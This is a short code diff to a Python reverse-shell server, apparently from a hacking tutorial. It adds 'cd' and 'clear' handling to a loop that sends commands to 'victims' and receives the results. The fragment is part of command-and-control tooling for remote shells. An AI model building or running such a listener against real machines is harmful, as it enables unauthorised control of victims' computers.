@@ -1,5 +1,6 @@
 import socket
 import json
+import os
 
 IP_ADDRESS = '192.168.0.16'
 # Port no. > 1000 is OK
@@ -43,6 +44,15 @@ def target_communication():
         # Server command input 'q' to exit shell
         if command == 'q':
             break
+        # From beginnging up to 3rd CHAR
+        # 'cd' command do nothing on Server
+        # 'cd' command works in client
+        elif command[:3] == 'cd ':
+            # From 3rd CHAR till the end
+            pass
+        # Executing 'clear' on Server
+        elif command == 'clear':
+            os.system('clear')
         else:
             # A callback
             # To receive results from victims once we fire our commands
